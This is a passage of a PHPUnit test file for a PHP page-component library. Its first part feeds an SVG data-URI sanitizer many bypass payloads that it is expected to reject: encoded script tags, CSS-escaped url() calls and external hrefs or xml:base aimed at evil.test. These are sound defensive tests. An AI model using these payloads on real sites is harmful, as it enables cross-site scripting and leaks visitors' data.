        $payload = "data:image/svg+xml,<?xml version=\"1.0\"?><!DOCTYPE svg [<!ENTITY x \"y\">]><svg>&x;</svg>";
        $this->assertSame('', pp_esc_image_src($payload));
    }

    public function testEscImageSrcRejectsMalformedXml(): void
    {
        $this->assertSame('', pp_esc_image_src('data:image/svg+xml,<svg><rect></svg>'));
    }

    public function testEscImageSrcAcceptsLegitimateMultilineFormattedSvg(): void
    {
        // Real-world hand-formatted/design-tool SVGs commonly span multiple
        // lines — this must not be treated as suspicious on its own.
        $svg = "data:image/svg+xml,<svg xmlns=\"http://www.w3.org/2000/svg\">\n  <circle r=\"5\"/>\n</svg>";
        $result = pp_esc_image_src($svg);
        $this->assertNotSame('', $result);
    }

    // ── Second-round cross-model adversarial review: bypasses of the
    // DOMDocument-based rewrite ──────────────────────────────────────────

    public function testEscImageSrcRejectsSixLayerEncodedScriptTag(): void
    {
        // Six layers of percent-encoding must not survive a decode budget
        // that gives up too early — the loop must converge to a TRUE fixed
        // point (or reject outright), not just decode a fixed N rounds and
        // proceed on a still-partially-encoded string.
        $payload = '<svg><script>alert(1)</script></svg>';
        for ($i = 0; $i < 6; $i++) {
            $payload = rawurlencode($payload);
        }
        $this->assertSame('', pp_esc_image_src('data:image/svg+xml,' . $payload));
    }

    public function testEscImageSrcRejectsBackslashCssEscapedScriptTag(): void
    {
        // "\3c"/"\3e" are inert to an XML parser (just three ordinary
        // characters) but CSS's own url()-token tokenizer resolves
        // backslash-hex escapes independently of percent-decoding — this
        // reconstructs "<script>" only once the browser's CSS parser reads
        // the surrounding style="...url(...)..." attribute.
        $payload = 'data:image/svg+xml,<svg><rect data-x="\3cscript\3ealert(1)\3c/script\3e"/></svg>';
        $result = pp_esc_image_src($payload);
        $this->assertNotSame('', $result, 'A literal backslash in otherwise-safe SVG content should not be rejected outright.');
        $this->assertStringNotContainsString('\\', $result);
    }

    public function testEscImageSrcRejectsStyleElement(): void
    {
        // Unlike <script>, an SVG's own <style> element IS applied during
        // ordinary <img>/background-image rendering — an @import inside it
        // would exfiltrate on every page view, not just on a deliberate
        // "open image in new tab."
        $payload = 'data:image/svg+xml,<svg><style>@import url(https://evil.test/x.css);</style></svg>';
        $this->assertSame('', pp_esc_image_src($payload));
    }

    public function testEscImageSrcRejectsExternalHrefOnUseElement(): void
    {
        $payload = 'data:image/svg+xml,<svg xmlns:xlink="http://www.w3.org/1999/xlink"><use xlink:href="https://evil.test/x.svg#y"/></svg>';
        $this->assertSame('', pp_esc_image_src($payload));
    }

    public function testEscImageSrcRejectsExternalHrefOnImageElement(): void
    {
        $payload = 'data:image/svg+xml,<svg><image href="https://evil.test/beacon.png"/></svg>';
        $this->assertSame('', pp_esc_image_src($payload));
    }

    public function testEscImageSrcAcceptsSameDocumentFragmentHrefOnUseElement(): void
    {
        // A <use> referencing a locally-defined symbol is a legitimate,
        // common SVG pattern and must not be rejected.
        $payload = 'data:image/svg+xml,<svg><symbol id="icon"><circle r="5"/></symbol><use href="#icon"/></svg>';
        $this->assertNotSame('', pp_esc_image_src($payload));
    }

    public function testEscImageSrcRejectsSmilAnimateRetargetingHref(): void
    {
        $payload = 'data:image/svg+xml,<svg><a id="x" href="https://safe.example/"><text>click</text></a>'
            . '<animate href="#x" attributeName="href" values="https://safe.example/;javascript:alert(1)" dur="1s"/></svg>';
        $this->assertSame('', pp_esc_image_src($payload));
    }

    public function testEscImageSrcRejectsProcessingInstruction(): void
    {
        $payload = 'data:image/svg+xml,<?xml-stylesheet type="text/css" href="https://evil.test/x.css"?><svg><circle r="5"/></svg>';
        $this->assertSame('', pp_esc_image_src($payload));
    }

    public function testEscImageSrcRejectsJavascriptUriWithEmbeddedNewline(): void
    {
        // Browser URL parsing strips embedded tab/newline/CR from anywhere
        // in a URL string, so "java\nscript:" resolves to "javascript:" at
        // navigation time even though no literal "javascript:" substring
        // (and no attribute value literally starting with it) exists in
        // the parsed DOM text.
        $payload = "data:image/svg+xml,<svg><a href=\"java&#x0A;script:alert(1)\">x</a></svg>";
        $this->assertSame('', pp_esc_image_src($payload));
    }

    public function testEscImageSrcRejectsDataTextHtmlHrefInsideSvg(): void
    {
        // A literal "<" inside an attribute value isn't valid XML, so the
        // nested script markup is XML-entity-escaped here, same as any
        // well-formed SVG author would have to write it.
        $payload = 'data:image/svg+xml,<svg><a href="data:text/html,&lt;script&gt;alert(1)&lt;/script&gt;">x</a></svg>';
        $this->assertSame('', pp_esc_image_src($payload));
    }

    // ── Third-round Codex review: empirically confirmed in a real browser
    // (Playwright/Chromium) that these attributes trigger real network
    // requests to an external host during ORDINARY rendering — no click,
    // no top-level navigation required ────────────────────────────────────

    public function testEscImageSrcRejectsExternalUrlInStyleFilter(): void
    {
        $payload = 'data:image/svg+xml,<svg xmlns="http://www.w3.org/2000/svg"><rect style="filter:url(https://evil.test/filter.svg#f)"/></svg>';
        $this->assertSame('', pp_esc_image_src($payload));
    }

    public function testEscImageSrcRejectsExternalUrlInFilterAttribute(): void
    {
        $payload = 'data:image/svg+xml,<svg xmlns="http://www.w3.org/2000/svg"><rect filter="url(https://evil.test/filter.svg#f)"/></svg>';
        $this->assertSame('', pp_esc_image_src($payload));
    }

    public function testEscImageSrcRejectsExternalUrlInFillAttribute(): void
    {
        $payload = 'data:image/svg+xml,<svg xmlns="http://www.w3.org/2000/svg"><rect fill="url(https://evil.test/pattern.svg#p)"/></svg>';
        $this->assertSame('', pp_esc_image_src($payload));
    }

    public function testEscImageSrcRejectsExternalUrlInStyleCursor(): void
    {
        $payload = 'data:image/svg+xml,<svg xmlns="http://www.w3.org/2000/svg"><rect style="cursor:url(https://evil.test/cursor.png), auto"/></svg>';
        $this->assertSame('', pp_esc_image_src($payload));
    }

    public function testEscImageSrcAcceptsSameDocumentFragmentUrlInFillAttribute(): void
    {
        // fill="url(#gradientId)" referencing a locally-defined gradient is
        // an extremely common, legitimate SVG pattern and must not be
        // rejected.
        $payload = 'data:image/svg+xml,<svg xmlns="http://www.w3.org/2000/svg"><defs><linearGradient id="g"/></defs><rect fill="url(#g)"/></svg>';
        $this->assertNotSame('', pp_esc_image_src($payload));
    }

    // ── Fourth-round Claude adversarial review ──────────────────────────────

    public function testEscImageSrcRejectsExternalHrefOnFeImageElement(): void
    {
        // <feImage> is an SVG filter primitive whose entire purpose is
        // fetching an image resource — the same "fires on ordinary render"
        // exfiltration risk as <use>/<image>, but on a different element
        // name the original element-scoped fix didn't cover.
        $payload = 'data:image/svg+xml,<svg xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink">'
            . '<filter id="f"><feImage xlink:href="https://evil.test/beacon.png" x="0" y="0" width="10" height="10"/></filter>'
            . '<rect width="10" height="10" filter="url(#f)"/></svg>';
        $this->assertSame('', pp_esc_image_src($payload));
    }

    public function testEscImageSrcRejectsNestedDataUriWithOnloadViaUseHref(): void
    {
        // A data: URI nested inside a <use href="..."> is validated
        // recursively — it's not automatically safe just because it's a
        // data: URI, since <use>'s clone-based reference model might treat
        // the referenced content as a live, scriptable subtree.
        $payload = 'data:image/svg+xml,<svg xmlns="http://www.w3.org/2000/svg">'
            . '<use href="data:image/svg+xml,%3Csvg%20onload%3D%22alert(1)%22%2F%3E"/></svg>';
        $this->assertSame('', pp_esc_image_src($payload));
    }

    public function testEscImageSrcAcceptsSameDocumentFragmentHrefOnPatternElement(): void
    {
        $payload = 'data:image/svg+xml,<svg xmlns="http://www.w3.org/2000/svg"><defs><pattern id="p"/></defs><rect fill="url(#p)"/></svg>';
        $this->assertNotSame('', pp_esc_image_src($payload));
    }

    public function testEscImageSrcRejectsExcessiveDataUriNestingDepth(): void
    {
        // Recursion depth guard: a data: URI nested inside a use/image href
        // is validated recursively (see the previous test) — that recursion
        // must be bounded rather than following an attacker-constructed
        // chain indefinitely. Exercised directly via the internal $depth
        // parameter (documented as "callers never need to pass this" —
        // ordinary callers always start at the default of 0).
        $svg = 'data:image/svg+xml,<svg xmlns="http://www.w3.org/2000/svg"><circle r="5"/></svg>';
        $this->assertNotSame('', pp_esc_image_src($svg, 0), 'Sanity check: valid at depth 0.');
        $this->assertSame('', pp_esc_image_src($svg, 4), 'Must reject once the depth cap is exceeded.');
    }

    // ── Sixth-round Codex adversarial review (empirical Playwright) ─────────

    public function testEscImageSrcRejectsCssHexEscapedUrlFunctionName(): void
    {
        // Browsers resolve CSS Syntax Level 3 \XX hex escapes BEFORE
        // recognizing the "url" function name. fill="u\72l(...)" is not the
        // literal substring "url(" and evaded the plain regex scan for it,
        // but Chromium resolves \72 to "r" while parsing the value and
        // fetches the external resource exactly as if "url(" had been
        // written literally — confirmed empirically via Playwright against
        // both the raw and base64-encoded payload forms.
        $svg = '<svg xmlns="http://www.w3.org/2000/svg" width="20" height="20">'
            . '<rect width="20" height="20" fill="u\72l(https://evil.test/p.svg#p)"/></svg>';
        $this->assertSame('', pp_esc_image_src('data:image/svg+xml,' . rawurlencode($svg)));
        $this->assertSame('', pp_esc_image_src('data:image/svg+xml;base64,' . base64_encode($svg)));
    }

    public function testEscImageSrcRejectsCssNumericEscapedUrlFunctionName(): void
    {
        // Every character of "url" escaped individually (\75\72\6c), not
        // just one — the same bypass class, exercised at its most extreme.
        $svg = '<svg xmlns="http://www.w3.org/2000/svg" width="20" height="20">'
            . '<rect width="20" height="20" fill="\75\72\6c(https://evil.test/p.svg#p)"/></svg>';
        $this->assertSame('', pp_esc_image_src('data:image/svg+xml,' . rawurlencode($svg)));
    }

    public function testEscImageSrcRejectsXmlBaseAttribute(): void
    {
        // xml:base (SVG/XML's equivalent of <base href>) can retarget a
        // "#fragment" reference — treated everywhere else in this function
        // as unconditionally same-document-safe — to resolve against an
        // attacker-controlled origin instead (RFC 3986 §5.3: a
        // fragment-only reference resolved against a base URL takes on the
        // base's scheme+authority+path). Rejected outright regardless of
        // whether a #fragment reference is even present.
        $payload = 'data:image/svg+xml,<svg xmlns="http://www.w3.org/2000/svg" xml:base="https://evil.test/">'
            . '<rect width="10" height="10"/></svg>';
        $this->assertSame('', pp_esc_image_src($payload));
    }

    public function testEscImageSrcRejectsXmlBaseWithFragmentReference(): void
    {
        // The concrete exploit shape: xml:base on the root plus a same-
        // document fill="url(#leak)" that would resolve externally.
        $payload = 'data:image/svg+xml,<svg xmlns="http://www.w3.org/2000/svg" xml:base="https://evil.test/marker">'
            . '<defs><linearGradient id="leak"/></defs><rect width="10" height="10" fill="url(#leak)"/></svg>';
        $this->assertSame('', pp_esc_image_src($payload));
    }

    public function testEscImageSrcAcceptsSameDocumentFragmentAfterCssUnescape(): void
    {
        // The CSS-unescape pass must not turn a legitimate, safe reference
        // into a false-positive rejection — a literal backslash preceding a
        // non-hex character is a valid CSS "escaped character" that decodes
        // to that character itself, so this must still resolve to the
        // harmless local fragment reference "#g".
        $payload = 'data:image/svg+xml,<svg xmlns="http://www.w3.org/2000/svg"><defs><linearGradient id="g"/></defs>'
            . '<rect fill="ur\6c(#g)"/></svg>';
        $this->assertNotSame('', pp_esc_image_src($payload));
    }

    // ── faq / stats style slots (#100) ───────────────────────────────────

    private function faqProps(array $extra = []): array
    {
        return array_merge(['title' => 'FAQ', 'items' => [['question' => 'Q?', 'answer' => 'A.']]], $extra);
    }

    private function statsProps(array $extra = []): array
    {
        return array_merge(['title' => 'Stats', 'items' => [['number' => '40+', 'label' => 'Years']]], $extra);
    }

    public function testFaqSchemaDeclaresAllSevenStyleSlots(): void
    {
        $schema = json_decode(file_get_contents(dirname(__DIR__) . '/components/faq/schema.json'), true);
        $slots = $schema['styling']['style_slots'];
        $expected = [
            '--faq-bg' => 'gradient',
            '--faq-item-bg' => 'gradient',
            '--faq-heading-color' => 'color',
            '--faq-question-color' => 'color',
            '--faq-answer-color' => 'color',
            '--faq-border-color' => 'color',
            '--faq-accent' => 'color',
        ];
        foreach ($expected as $name => $type) {
            $this->assertArrayHasKey($name, $slots, "faq must declare {$name}.");
            $this->assertSame($type, $slots[$name]['type'], "{$name} must be type {$type}.");
            $this->assertArrayHasKey('default', $slots[$name]);
            $this->assertNotEmpty($slots[$name]['description']);
        }
    }

    public function testStatsSchemaDeclaresAllFourStyleSlots(): void
    {
        $schema = json_decode(file_get_contents(dirname(__DIR__) . '/components/stats/schema.json'), true);
        $slots = $schema['styling']['style_slots'];
        $expected = [
            '--stats-bg' => 'gradient',
            '--stats-title-color' => 'color',
            '--stats-number-color' => 'color',
            '--stats-label-color' => 'color',
        ];
        foreach ($expected as $name => $type) {
            $this->assertArrayHasKey($name, $slots, "stats must declare {$name}.");
            $this->assertSame($type, $slots[$name]['type'], "{$name} must be type {$type}.");
            $this->assertArrayHasKey('default', $slots[$name]);
            $this->assertNotEmpty($slots[$name]['description']);
        }
    }

    public function testFaqRendersHeadingColorSlot(): void
    {
        // The exact production regression #100 fixes: faq could not reach brand
        // fidelity on a dark surface because it had no --faq-heading-color slot.
        $html = $this->render('faq', array_merge($this->faqProps(), [
            '__pp_style' => ['--faq-heading-color' => '#ffffff'],
        ]));
        $this->assertStringContainsString('--faq-heading-color: #ffffff', $html);
    }

    public function testFaqRendersAllSevenSlots(): void
    {
        $overrides = [
            '--faq-bg' => 'linear-gradient(135deg, #1a1a2e, #16121f)',
            '--faq-item-bg' => '#222222',
            '--faq-heading-color' => '#ffffff',
            '--faq-question-color' => '#eeeeee',
            '--faq-answer-color' => '#cccccc',
            '--faq-border-color' => '#333333',
            '--faq-accent' => '#ea3900',
        ];
        $html = $this->render('faq', array_merge($this->faqProps(), ['__pp_style' => $overrides]));
        foreach ($overrides as $slot => $value) {
            $this->assertStringContainsString("{$slot}: {$value}", $html, "{$slot} did not render.");
        }
    }

    public function testFaqRejectsInjectionInStyleSlot(): void
    {
        $html = $this->render('faq', array_merge($this->faqProps(), [
            '__pp_style' => ['--faq-heading-color' => '#fff; background:url(evil)'],
        ]));
        $this->assertStringNotContainsString('url(evil)', $html);
    }

    // ── faq id / eyebrow / theme (#231) — parity with heading components ──

    public function testFaqRendersIdForAnchorLinking(): void
    {
        // #231: faq is a heading component and must be anchor-linkable, like every
        // other one. The id lands on the section element so `#faq` has a target.
        $html = $this->render('faq', $this->faqProps(['id' => 'faq']));
        $this->assertStringContainsString('<section id="faq"', $html);
    }

    public function testFaqOmitsIdAttributeWhenUnset(): void
    {
        $html = $this->render('faq', $this->faqProps());
        $this->assertStringNotContainsString('<section id=', $html);
    }

    public function testFaqEyebrowRendersAsPill(): void
    {
        $html = $this->render('faq', $this->faqProps(['eyebrow' => 'KICKER']));
        $this->assertStringContainsString('class="faq__eyebrow">KICKER<', $html);
    }

    public function testFaqEyebrowOmittedWhenUnset(): void
    {
        $html = $this->render('faq', $this->faqProps());
        $this->assertStringNotContainsString('faq__eyebrow', $html);
    }

    public function testFaqEyebrowColorSlotsRender(): void
    {
        $html = $this->render('faq', $this->faqProps([
            'eyebrow' => 'KICKER',
            '__pp_style' => ['--faq-eyebrow-color' => '#ffffff', '--faq-eyebrow-bg' => '#111111'],
        ]));
        $this->assertStringContainsString('--faq-eyebrow-color: #ffffff', $html);
        $this->assertStringContainsString('--faq-eyebrow-bg: #111111', $html);
    }

    public function testFaqDarkThemeAddsClass(): void
    {
        $html = $this->render('faq', $this->faqProps(['theme' => 'dark']));
        $this->assertStringContainsString('class="faq faq--dark"', $html);
    }

    public function testFaqInvertedThemeAddsClass(): void
    {
        $html = $this->render('faq', $this->faqProps(['theme' => 'inverted']));
        $this->assertStringContainsString('class="faq faq--inverted"', $html);
    }

    public function testFaqDefaultThemeAddsNoModifierClass(): void
    {
        $html = $this->render('faq', $this->faqProps());
        $this->assertStringContainsString('class="faq"', $html);
        $this->assertStringNotContainsString('faq--', $html);
    }

    public function testFaqUnknownThemeClampsToDefault(): void
    {
        // Composition validation does not check enum values (that is #147, deferred),
        // so the render is the actual contract: an unknown theme must not emit an
        // unstyled faq--<garbage> class (mirrors section/grid clamping).
        $html = $this->render('faq', $this->faqProps(['theme' => 'neon']));
        $this->assertStringNotContainsString('faq--neon', $html);
        $this->assertStringContainsString('class="faq"', $html);
    }

    public function testStatsRendersAllFourSlots(): void
    {
        $overrides = [
            '--stats-bg' => 'radial-gradient(#fff, #000)',
            '--stats-title-color' => '#111111',
            '--stats-number-color' => '#ea3900',
            '--stats-label-color' => '#666666',
        ];
        $html = $this->render('stats', array_merge($this->statsProps(), ['__pp_style' => $overrides]));
        foreach ($overrides as $slot => $value) {
            $this->assertStringContainsString("{$slot}: {$value}", $html, "{$slot} did not render.");
        }
    }

    public function testStatsStyleSlotMergesWithBackgroundImage(): void
    {
        // stats.php's __pp_style rendering must coexist with the pre-existing
        // background_image inline-style mechanism (same pattern as hero/section).
        $html = $this->render('stats', array_merge($this->statsProps(), [
            '__pp_style' => ['--stats-number-color' => '#ea3900'],
            'background_image' => 'https://example.com/bg.jpg',
        ]));
        $this->assertStringContainsString('--stats-number-color: #ea3900', $html);
        $this->assertStringContainsString('background-image:url(', $html);
    }

    public function testStatsRejectsInjectionInStyleSlot(): void
    {
        $html = $this->render('stats', array_merge($this->statsProps(), [
            '__pp_style' => ['--stats-title-color' => '#fff; background:url(evil)'],
        ]));
        $this->assertStringNotContainsString('url(evil)', $html);
    }

    // ── End-to-end: exact production regression from #36 ────────────────────

    public function testHeroSplitVariantRendersDataUriSvgImageSrc(): void
    {
        $svg = 'data:image/svg+xml,<svg xmlns="http://www.w3.org/2000/svg"><rect width="10" height="10"/></svg>';
        $html = $this->render('hero', [
            'title' => 'Welcome',
            'layout' => 'split',
            'image_url' => $svg,
        ]);
        $this->assertStringNotContainsString('src=""', $html, 'The exact #36 production regression: src="" instead of the data URI.');
        $this->assertMatchesRegularExpression('/src="data:image\/svg\+xml,[^"]*"/', $html);
    }

    public function testHeroCoverVariantRendersDataUriSvgBackgroundImage(): void
    {
        $svg = 'data:image/svg+xml,<svg xmlns="http://www.w3.org/2000/svg"><rect width="10" height="10"/></svg>';
        $html = $this->render('hero', [
            'title' => 'Welcome',
            'layout' => 'cover',
            'image_url' => $svg,
        ]);
        $this->assertStringContainsString('background-image:url(data:image/svg+xml,', $html);
        $this->assertStringNotContainsString('background-image:url();', $html);
    }

    // ── Section-header pattern: eyebrow + subheading + alignment (#102/#85) ──

    private function gridProps(array $extra = []): array
    {
        return array_merge(['items' => [['title' => 'Item', 'text' => 'Text']]], $extra);
    }

    private function sectionProps(array $extra = []): array
    {
        return array_merge(['body' => '<p>Body</p>'], $extra);
    }

    public function testHeroEyebrowRenders(): void
    {
        // Regression pin for #85: hero's eyebrow prop now actually renders.
        $html = $this->render('hero', ['title' => 'T', 'eyebrow' => 'NEW']);
        $this->assertStringContainsString('class="hero__eyebrow"', $html);
        $this->assertStringContainsString('>NEW<', $html);
    }

    public function testHeroEyebrowOmittedWhenUnset(): void
    {
        $html = $this->render('hero', ['title' => 'T']);
        $this->assertStringNotContainsString('hero__eyebrow', $html);
    }

    /**
     * Regression pin for #225: the pill only holds because the eyebrow is a direct
     * flex item of .hero__content and the CSS gives it align-self. Wrapping it in
     * any intermediate element would leave the CSS pins green while the eyebrow
     * silently went back to stretching across the full hero content width.
     */
    public function testHeroEyebrowIsDirectChildOfHeroContent(): void
    {
        foreach (['left', 'centered', 'split', 'cover'] as $layout) {
            $html = $this->render('hero', [
                'title'   => 'T',
                'eyebrow' => 'NEW',
                'layout'  => $layout,
            ]);
            // No element of ANY kind may open between the two tags — a <span> or <p>
            // wrapper destroys the flex-item relationship just as surely as a <div>,
            // and would leave every CSS pin green. Position within hero__content, and
            // any attributes it grows, stay free: direct childhood is the whole contract.
            $this->assertMatchesRegularExpression(
                '/<div class="hero__content"[^>]*>(?:(?!<[a-zA-Z])[\s\S])*?<span class="hero__eyebrow"/',
                $html,
                "hero__eyebrow must be a direct child of hero__content (layout: {$layout})"
            );
        }
    }

    /**
     * Regression pin for #224: the desktop column count is selected in CSS off
     * data-pp-count, so the attribute is a contract, not a detail. Without this
     * pin, dropping or renaming it would leave the CSS pins green while 3-item
     * grids silently fell back to two columns and orphaned the third card.
     */
    public function testGridEmitsItemCountAttribute(): void
    {
        $items = [
            ['title' => 'One',   'text' => 'A'],
            ['title' => 'Two',   'text' => 'B'],
            ['title' => 'Three', 'text' => 'C'],
        ];

        $html = $this->render('grid', ['items' => $items]);
        $this->assertStringContainsString('data-pp-count="3"', $html);

        $html = $this->render('grid', ['items' => array_slice($items, 0, 2)]);
        $this->assertStringContainsString('data-pp-count="2"', $html);

        // #297: a single-item grid must emit count="1" so the CSS count-1 rule
        // (full-width track) can match it, instead of falling through to the
        // two-column base and stranding the lone card in the left column.
        $html = $this->render('grid', ['items' => array_slice($items, 0, 1)]);
        $this->assertStringContainsString('data-pp-count="1"', $html);
    }

    public function testGridEyebrowSubheadingAndCenterAlignRender(): void
    {
        $html = $this->render('grid', $this->gridProps([
            'title' => 'Heading',
            'eyebrow' => 'KICKER',
            'subheading' => 'Supporting line',
            'heading_align' => 'center',
        ]));
        $this->assertStringContainsString('class="grid__header grid__header--center"', $html);
        $this->assertStringContainsString('class="grid__eyebrow">KICKER<', $html);
        $this->assertStringContainsString('class="grid__heading">Heading<', $html);
        $this->assertStringContainsString('class="grid__subheading">Supporting line<', $html);
    }

    public function testGridHeaderAlignDefaultsToStartAndOmitsCenterClass(): void
    {
        $html = $this->render('grid', $this->gridProps(['title' => 'Heading']));
        $this->assertStringContainsString('class="grid__header">', $html);
        $this->assertStringNotContainsString('grid__header--center', $html);
    }

    public function testGridHeaderAlignInvalidFallsBackToStart(): void
    {
        $html = $this->render('grid', $this->gridProps(['title' => 'Heading', 'heading_align' => 'end']));
        $this->assertStringNotContainsString('grid__header--center', $html);
    }

    public function testGridHeaderOmittedWhenNoTitleEyebrowOrSubheading(): void
    {
        $html = $this->render('grid', $this->gridProps());
        $this->assertStringNotContainsString('grid__header', $html);
    }

    public function testSectionEyebrowSubheadingAndCenterAlignRenderTextOnly(): void
    {
        $html = $this->render('section', $this->sectionProps([
            'title' => 'Heading',
            'eyebrow' => 'KICKER',
            'subheading' => 'Supporting line',
            'heading_align' => 'center',
        ]));
        $this->assertStringContainsString('class="section__header section__header--center"', $html);
        $this->assertStringContainsString('class="section__eyebrow">KICKER<', $html);
        $this->assertStringContainsString('class="section__subheading">Supporting line<', $html);
    }

    public function testSectionEyebrowRendersInImageLayout(): void
    {
        // The image-left/image-right layout has a SEPARATE title block in
        // section.php — must also carry the header pattern, not just text-only.
        $html = $this->render('section', $this->sectionProps([
            'title' => 'Heading',
            'eyebrow' => 'KICKER',
            'layout' => 'image-left',
            'image_url' => 'https://example.com/img.jpg',
        ]));
        $this->assertStringContainsString('class="section__eyebrow">KICKER<', $html);
    }

    public function testCtaEyebrowRenders(): void
    {
        $html = $this->render('cta', $this->ctaProps(['eyebrow' => 'KICKER']));
        $this->assertStringContainsString('class="cta__eyebrow">KICKER<', $html);
    }

    public function testCtaEyebrowOmittedWhenUnset(): void
    {
        $html = $this->render('cta', $this->ctaProps());
        $this->assertStringNotContainsString('cta__eyebrow', $html);
    }

    /**
     * Regression pin for #255: the pill only holds because `display: contents` on
     * .cta__text dissolves that box and promotes the eyebrow into the .cta__inner
     * grid, where the CSS places it in row 1. display:contents only dissolves the ONE
     * box it is set on — wrapping the eyebrow in any intermediate element leaves it
     * inside a box that is still there, so it stops being a grid item, the placement
     * rules stop applying, and every CSS pin stays green while the render changes.
     */
    public function testCtaEyebrowIsDirectChildOfCtaText(): void
    {
        foreach (['full-width', 'inline'] as $layout) {
            $html = $this->render('cta', $this->ctaProps([
                'eyebrow' => 'NEW',
                'layout'  => $layout,
            ]));
            // No element of ANY kind may open between the two tags. Attributes and
            // whitespace stay free: direct childhood is the whole contract.
            $this->assertMatchesRegularExpression(
                '/<div class="cta__text"[^>]*>(?:(?!<[a-zA-Z])[\s\S])*?<span class="cta__eyebrow"/',
                $html,
                "cta__eyebrow must be a direct child of cta__text (layout: {$layout})"
            );
        }
    }

    public function testHeroSchemaDeclaresEyebrowSlots(): void
    {
        $schema = json_decode(file_get_contents(dirname(__DIR__) . '/components/hero/schema.json'), true);
        $slots = $schema['styling']['style_slots'];
        $this->assertArrayHasKey('--hero-eyebrow-color', $slots);
        $this->assertArrayHasKey('--hero-eyebrow-bg', $slots);
    }

    public function testGridSchemaDeclaresHeaderSlots(): void
    {
        $schema = json_decode(file_get_contents(dirname(__DIR__) . '/components/grid/schema.json'), true);
        $slots = $schema['styling']['style_slots'];
        foreach (['--grid-eyebrow-color', '--grid-eyebrow-bg', '--grid-subheading-color'] as $name) {
            $this->assertArrayHasKey($name, $slots, "grid must declare {$name}.");
        }
    }

    public function testSectionSchemaDeclaresHeaderSlots(): void
    {
        $schema = json_decode(file_get_contents(dirname(__DIR__) . '/components/section/schema.json'), true);
        $slots = $schema['styling']['style_slots'];
        foreach (['--section-eyebrow-color', '--section-eyebrow-bg', '--section-subheading-color'] as $name) {
            $this->assertArrayHasKey($name, $slots, "section must declare {$name}.");
        }
    }

    public function testCtaSchemaDeclaresEyebrowSlots(): void
    {
        $schema = json_decode(file_get_contents(dirname(__DIR__) . '/components/cta/schema.json'), true);
        $slots = $schema['styling']['style_slots'];
        $this->assertArrayHasKey('--cta-eyebrow-color', $slots);
        $this->assertArrayHasKey('--cta-eyebrow-bg', $slots);
    }

    public function testGridEyebrowRejectsInjectionInStyleSlot(): void
    {
        $html = $this->render('grid', $this->gridProps([
            'title' => 'H',
            'eyebrow' => 'KICKER',
            '__pp_style' => ['--grid-eyebrow-color' => '#fff; background:url(evil)'],
        ]));
        $this->assertStringNotContainsString('url(evil)', $html);
    }

    // ── pp_render_heading_with_accent() + title_accent (#110) ────────────────
    // Structured, plain-text mechanism — NOT an HTML/markup allowlist. Both
    // $title and $accent are ordinary text; this only decides where to split
    // them. No new markup-parsing surface, so these tests focus on: correct
    // splitting, safe fallback when the accent doesn't actually match, and
    // that every fragment is still escaped exactly like a plain title always was.

    public function testRenderHeadingWithAccentSplitsCorrectly(): void
    {
        $html = pp_render_heading_with_accent('Seguridad y salud para tu WordPress', 'Seguridad', 'hero__title-accent');
        $this->assertSame(
            '<span class="hero__title-accent">Seguridad</span> y salud para tu WordPress',
            $html
        );
    }

    public function testRenderHeadingWithAccentMatchesFirstOccurrenceOnly(): void
    {
        $html = pp_render_heading_with_accent('go go go', 'go', 'x');
        $this->assertSame('<span class="x">go</span> go go', $html);
    }

    public function testRenderHeadingWithAccentFallsBackWhenNoMatch(): void
    {
        $html = pp_render_heading_with_accent('Plain title', 'not-present', 'x');
        $this->assertSame('Plain title', $html);
    }

    public function testRenderHeadingWithAccentFallsBackWhenEmpty(): void
    {
        $html = pp_render_heading_with_accent('Plain title', '', 'x');
        $this->assertSame('Plain title', $html);
    }

    public function testRenderHeadingWithAccentEscapesBothFragments(): void
    {
        // Confirms zero new markup-parsing surface: an attempted HTML/script
        // injection in EITHER the title or the accent substring is escaped
        // exactly as a plain esc_html() title always was.
        $html = pp_render_heading_with_accent('<script>alert(1)</script>', '<script>', 'x');
        $this->assertStringNotContainsString('<script>', $html);
        $this->assertStringContainsString('&lt;script&gt;', $html);
    }

    public function testRenderHeadingWithAccentIsCaseSensitiveExactMatch(): void
    {
        // A case-mismatched "accent" is not a real substring match — falls
        // back to plain title, matching the documented "must match exactly"
        // contract rather than doing a fuzzy/case-insensitive search.
        $html = pp_render_heading_with_accent('Seguridad y salud', 'seguridad', 'x');
        $this->assertSame('Seguridad y salud', $html);
    }

    public function testHeroTitleAccentRenders(): void
    {
        $html = $this->render('hero', ['title' => 'Seguridad y salud', 'title_accent' => 'Seguridad']);
        $this->assertStringContainsString('<span class="hero__title-accent">Seguridad</span> y salud', $html);
    }

    public function testHeroTitleAccentOmittedWhenNoMatch(): void
    {
        $html = $this->render('hero', ['title' => 'Seguridad y salud', 'title_accent' => 'xyz']);
        $this->assertStringNotContainsString('hero__title-accent', $html);
        $this->assertStringContainsString('Seguridad y salud', $html);
    }

    public function testGridTitleAccentRenders(): void
    {
        $html = $this->render('grid', $this->gridProps(['title' => 'Fast and Safe', 'title_accent' => 'Fast']));
        $this->assertStringContainsString('<span class="grid__heading-accent">Fast</span> and Safe', $html);
    }

    public function testSectionTitleAccentRendersInBothLayouts(): void
    {
        $textOnly = $this->render('section', $this->sectionProps(['title' => 'Fast and Safe', 'title_accent' => 'Fast']));
        $this->assertStringContainsString('<span class="section__title-accent">Fast</span> and Safe', $textOnly);

        $imageLayout = $this->render('section', $this->sectionProps([
            'title' => 'Fast and Safe',
            'title_accent' => 'Fast',
            'layout' => 'image-left',
            'image_url' => 'https://example.com/img.jpg',
        ]));
        $this->assertStringContainsString('<span class="section__title-accent">Fast</span> and Safe', $imageLayout);
    }

    public function testCtaTitleAccentRenders(): void
    {
        $html = $this->render('cta', $this->ctaProps(['title' => 'Fast and Safe', 'title_accent' => 'Fast']));
        $this->assertStringContainsString('<span class="cta__title-accent">Fast</span> and Safe', $html);
    }

    public function testFaqTitleAccentRenders(): void
    {
        $html = $this->render('faq', $this->faqProps(['title' => 'Fast Answers', 'title_accent' => 'Fast']));
        $this->assertStringContainsString('<span class="faq__heading-accent">Fast</span> Answers', $html);
    }

    public function testStatsTitleAccentRenders(): void
    {
        $html = $this->render('stats', $this->statsProps(['title' => 'Fast Results', 'title_accent' => 'Fast']));
        $this->assertStringContainsString('<span class="stats__heading-accent">Fast</span> Results', $html);
    }

    public function testAllSixComponentsDeclareTitleAccentSlot(): void
    {
        $expected = [
            'hero'    => '--hero-title-accent-color',
            'grid'    => '--grid-heading-accent-color',
            'section' => '--section-title-accent-color',
            'cta'     => '--cta-title-accent-color',
            'faq'     => '--faq-heading-accent-color',
            'stats'   => '--stats-title-accent-color',
        ];
        foreach ($expected as $component => $slot) {
